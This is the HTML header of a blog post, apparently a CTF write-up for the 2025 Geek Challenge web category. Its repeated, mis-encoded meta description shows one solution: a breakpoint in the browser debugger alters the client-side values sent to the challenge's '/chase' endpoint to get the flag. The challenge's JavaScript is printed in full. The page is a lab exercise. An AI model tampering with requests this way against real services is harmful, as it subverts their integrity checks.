<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘ | Lhz&#39;s blog</title>
<meta name="keywords" content="æå®¢å¤§æŒ‘æˆ˜">
<meta name="description" content="å£°æ˜
ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« 
é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ
#JavaScript
é¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ
å¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»è¿½èµ¶æŒ‰é”®ï¼Œå…¶å®åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯
...
const payload = { 
    achilles_distance: achillesPos,
    tortoise_distance: tortoisePos,
};
fetch(&#39;/chase&#39;, {             // åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡
    method: &#39;POST&#39;,           // ä½¿ achillesPos &gt; tortoisePos
    headers: {
        &#39;Content-Type&#39;: &#39;application/json&#39;,
    },
    body: JSON.stringify({ 
        &#34;data&#34;: encryptData(payload) 
    }),
})
...
ä¿®æ”¹åç»§ç»­æ‰§è¡Œè„šæœ¬å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç 
function encryptData(obj) {
Â  Â  const jsonString = JSON.stringify(obj);
Â  Â  return btoa(unescape(encodeURIComponent(jsonString)));
}

function decryptData(encodedString) {
Â  Â  const jsonString = decodeURIComponent(escape(atob(encodedString)));
Â  Â  return JSON.parse(jsonString);
}

document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
Â  Â  const chaseBtn = document.getElementById(&#39;chase-btn&#39;);
Â  Â  const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;);
Â  Â  const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;);
Â  Â  const resultDiv = document.getElementById(&#39;result&#39;);

Â  Â  let achillesPos = 0;
Â  Â  let tortoisePos = 10000000000; // Initial head start for the tortoise

Â  Â  achillesDistanceSpan.textContent = achillesPos.toFixed(2);
Â  Â  tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

Â  Â  chaseBtn.addEventListener(&#39;click&#39;, () =&gt; {
Â  Â  Â  Â  // Achilles moves to the tortoise&#39;s current position
Â  Â  Â  Â  const achillesMoveDistance = tortoisePos - achillesPos;
Â  Â  Â  Â  achillesPos = tortoisePos;

Â  Â  Â  Â  // The tortoise moves 1/10th of the distance Achilles just covered
Â  Â  Â  Â  const tortoiseMoveDistance = achillesMoveDistance / 10;
Â  Â  Â  Â  tortoisePos &#43;= tortoiseMoveDistance;

Â  Â  Â  Â  achillesDistanceSpan.textContent = achillesPos.toFixed(2);
Â  Â  Â  Â  tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

Â  Â  Â  Â  const payload = {
Â  Â  Â  Â  Â  Â  achilles_distance: achillesPos,
Â  Â  Â  Â  Â  Â  tortoise_distance: tortoisePos,
Â  Â  Â  Â  };

Â  Â  Â  Â  fetch(&#39;/chase&#39;, {
Â  Â  Â  Â  Â  Â  method: &#39;POST&#39;,
Â  Â  Â  Â  Â  Â  headers: {
Â  Â  Â  Â  Â  Â  Â  Â  &#39;Content-Type&#39;: &#39;application/json&#39;,
Â  Â  Â  Â  Â  Â  },
Â  Â  Â  Â  Â  Â  body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }),
Â  Â  Â  Â  })
Â  Â  Â  Â  .then(response =&gt; response.json())
Â  Â  Â  Â  .then(encryptedResponse =&gt; {
Â  Â  Â  Â  Â  Â  if (encryptedResponse.data) {
Â  Â  Â  Â  Â  Â  Â  Â  const data = decryptData(encryptedResponse.data);
Â  Â  Â  Â  Â  Â  Â  Â  if (data.flag) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.style.whiteSpace = &#39;pre-wrap&#39;;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = `ä½ è¿½ä¸Šå®ƒäº†ï¼\n${data.flag}`;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  chaseBtn.disabled = true;
Â  Â  Â  Â  Â  Â  Â  Â  } else if (data.message) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = data.message;
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  Â  Â  Â  console.error(&#39;Error:&#39;, encryptedResponse.error);
Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = `å‘ç”Ÿé”™è¯¯: ${encryptedResponse.error}`;
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  })
Â  Â  Â  Â  .catch(error =&gt; {
Â  Â  Â  Â  Â  Â  console.error(&#39;Error:&#39;, error);
Â  Â  Â  Â  Â  Â  resultDiv.textContent = &#39;å‘ç”Ÿé”™è¯¯ã€‚&#39;;
Â  Â  Â  Â  });
Â  Â  });
}); 
Vibe SEO
#ç›®å½•æ‰«æ #Linux">
<meta name="author" content="">
<link rel="canonical" href="https://lhzzz08.github.io/posts/geekchallengewebwp/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://lhzzz08.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="16x16" href="https://lhzzz08.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="32x32" href="https://lhzzz08.github.io/favicon.svg">
<link rel="apple-touch-icon" href="https://lhzzz08.github.io/apple-icon.png">
<link rel="mask-icon" href="https://lhzzz08.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://lhzzz08.github.io/posts/geekchallengewebwp/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://lhzzz08.github.io/posts/geekchallengewebwp/">
  <meta property="og:site_name" content="Lhz&#39;s blog">
  <meta property="og:title" content="2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘">
  <meta property="og:description" content="å£°æ˜ ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« 
é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ #JavaScript
é¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ
å¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»è¿½èµ¶æŒ‰é”®ï¼Œå…¶å®åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯
... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(&#39;/chase&#39;, { // åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡ method: &#39;POST&#39;, // ä½¿ achillesPos &gt; tortoisePos headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, }, body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }), }) ... ä¿®æ”¹åç»§ç»­æ‰§è¡Œè„šæœ¬å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç 
function encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; { const chaseBtn = document.getElementById(&#39;chase-btn&#39;); const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;); const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;); const resultDiv = document.getElementById(&#39;result&#39;); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener(&#39;click&#39;, () =&gt; { // Achilles moves to the tortoise&#39;s current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos &#43;= tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(&#39;/chase&#39;, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, }, body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }), }) .then(response =&gt; response.json()) .then(encryptedResponse =&gt; { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message resultDiv.style.whiteSpace = &#39;pre-wrap&#39;; resultDiv.textContent = `ä½ è¿½ä¸Šå®ƒäº†ï¼\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error(&#39;Error:&#39;, encryptedResponse.error); resultDiv.textContent = `å‘ç”Ÿé”™è¯¯: ${encryptedResponse.error}`; } }) .catch(error =&gt; { console.error(&#39;Error:&#39;, error); resultDiv.textContent = &#39;å‘ç”Ÿé”™è¯¯ã€‚&#39;; }); }); }); Vibe SEO #ç›®å½•æ‰«æ #Linux">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-24T21:04:46+08:00">
    <meta property="article:modified_time" content="2025-11-24T21:04:46+08:00">
    <meta property="article:tag" content="æå®¢å¤§æŒ‘æˆ˜">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘">
<meta name="twitter:description" content="å£°æ˜
ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« 
é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ
#JavaScript
é¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ
å¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»è¿½èµ¶æŒ‰é”®ï¼Œå…¶å®åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯
...
const payload = { 
    achilles_distance: achillesPos,
    tortoise_distance: tortoisePos,
};
fetch(&#39;/chase&#39;, {             // åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡
    method: &#39;POST&#39;,           // ä½¿ achillesPos &gt; tortoisePos
    headers: {
        &#39;Content-Type&#39;: &#39;application/json&#39;,
    },
    body: JSON.stringify({ 
        &#34;data&#34;: encryptData(payload) 
    }),
})
...
ä¿®æ”¹åç»§ç»­æ‰§è¡Œè„šæœ¬å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç 
function encryptData(obj) {
Â  Â  const jsonString = JSON.stringify(obj);
Â  Â  return btoa(unescape(encodeURIComponent(jsonString)));
}

function decryptData(encodedString) {
Â  Â  const jsonString = decodeURIComponent(escape(atob(encodedString)));
Â  Â  return JSON.parse(jsonString);
}

document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
Â  Â  const chaseBtn = document.getElementById(&#39;chase-btn&#39;);
Â  Â  const achillesDistanceSpan = document.getElementById(&#39;achilles-distance&#39;);
Â  Â  const tortoiseDistanceSpan = document.getElementById(&#39;tortoise-distance&#39;);
Â  Â  const resultDiv = document.getElementById(&#39;result&#39;);

Â  Â  let achillesPos = 0;
Â  Â  let tortoisePos = 10000000000; // Initial head start for the tortoise

Â  Â  achillesDistanceSpan.textContent = achillesPos.toFixed(2);
Â  Â  tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

Â  Â  chaseBtn.addEventListener(&#39;click&#39;, () =&gt; {
Â  Â  Â  Â  // Achilles moves to the tortoise&#39;s current position
Â  Â  Â  Â  const achillesMoveDistance = tortoisePos - achillesPos;
Â  Â  Â  Â  achillesPos = tortoisePos;

Â  Â  Â  Â  // The tortoise moves 1/10th of the distance Achilles just covered
Â  Â  Â  Â  const tortoiseMoveDistance = achillesMoveDistance / 10;
Â  Â  Â  Â  tortoisePos &#43;= tortoiseMoveDistance;

Â  Â  Â  Â  achillesDistanceSpan.textContent = achillesPos.toFixed(2);
Â  Â  Â  Â  tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

Â  Â  Â  Â  const payload = {
Â  Â  Â  Â  Â  Â  achilles_distance: achillesPos,
Â  Â  Â  Â  Â  Â  tortoise_distance: tortoisePos,
Â  Â  Â  Â  };

Â  Â  Â  Â  fetch(&#39;/chase&#39;, {
Â  Â  Â  Â  Â  Â  method: &#39;POST&#39;,
Â  Â  Â  Â  Â  Â  headers: {
Â  Â  Â  Â  Â  Â  Â  Â  &#39;Content-Type&#39;: &#39;application/json&#39;,
Â  Â  Â  Â  Â  Â  },
Â  Â  Â  Â  Â  Â  body: JSON.stringify({ &#34;data&#34;: encryptData(payload) }),
Â  Â  Â  Â  })
Â  Â  Â  Â  .then(response =&gt; response.json())
Â  Â  Â  Â  .then(encryptedResponse =&gt; {
Â  Â  Â  Â  Â  Â  if (encryptedResponse.data) {
Â  Â  Â  Â  Â  Â  Â  Â  const data = decryptData(encryptedResponse.data);
Â  Â  Â  Â  Â  Â  Â  Â  if (data.flag) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  // Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.style.whiteSpace = &#39;pre-wrap&#39;;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = `ä½ è¿½ä¸Šå®ƒäº†ï¼\n${data.flag}`;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  chaseBtn.disabled = true;
Â  Â  Â  Â  Â  Â  Â  Â  } else if (data.message) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = data.message;
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  Â  Â  Â  console.error(&#39;Error:&#39;, encryptedResponse.error);
Â  Â  Â  Â  Â  Â  Â  Â  resultDiv.textContent = `å‘ç”Ÿé”™è¯¯: ${encryptedResponse.error}`;
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  })
Â  Â  Â  Â  .catch(error =&gt; {
Â  Â  Â  Â  Â  Â  console.error(&#39;Error:&#39;, error);
Â  Â  Â  Â  Â  Â  resultDiv.textContent = &#39;å‘ç”Ÿé”™è¯¯ã€‚&#39;;
Â  Â  Â  Â  });
Â  Â  });
}); 
Vibe SEO
#ç›®å½•æ‰«æ #Linux">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://lhzzz08.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘",
      "item": "https://lhzzz08.github.io/posts/geekchallengewebwp/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘",
  "name": "2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘",
  "description": "å£°æ˜ ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« \né˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ #JavaScript\né¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ\nå¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»è¿½èµ¶æŒ‰é”®ï¼Œå…¶å®åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯\n... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(\u0026#39;/chase\u0026#39;, { // åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡ method: \u0026#39;POST\u0026#39;, // ä½¿ achillesPos \u0026gt; tortoisePos headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ \u0026#34;data\u0026#34;: encryptData(payload) }), }) ... ä¿®æ”¹åç»§ç»­æ‰§è¡Œè„šæœ¬å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç \nfunction encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { const chaseBtn = document.getElementById(\u0026#39;chase-btn\u0026#39;); const achillesDistanceSpan = document.getElementById(\u0026#39;achilles-distance\u0026#39;); const tortoiseDistanceSpan = document.getElementById(\u0026#39;tortoise-distance\u0026#39;); const resultDiv = document.getElementById(\u0026#39;result\u0026#39;); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { // Achilles moves to the tortoise\u0026#39;s current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos += tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch(\u0026#39;/chase\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ \u0026#34;data\u0026#34;: encryptData(payload) }), }) .then(response =\u0026gt; response.json()) .then(encryptedResponse =\u0026gt; { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use \u0026#39;pre-wrap\u0026#39; to respect newlines in the fake flag message resultDiv.style.whiteSpace = \u0026#39;pre-wrap\u0026#39;; resultDiv.textContent = `ä½ è¿½ä¸Šå®ƒäº†ï¼\\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error(\u0026#39;Error:\u0026#39;, encryptedResponse.error); resultDiv.textContent = `å‘ç”Ÿé”™è¯¯: ${encryptedResponse.error}`; } }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); resultDiv.textContent = \u0026#39;å‘ç”Ÿé”™è¯¯ã€‚\u0026#39;; }); }); }); Vibe SEO #ç›®å½•æ‰«æ #Linux\n",
  "keywords": [
    "æå®¢å¤§æŒ‘æˆ˜"
  ],
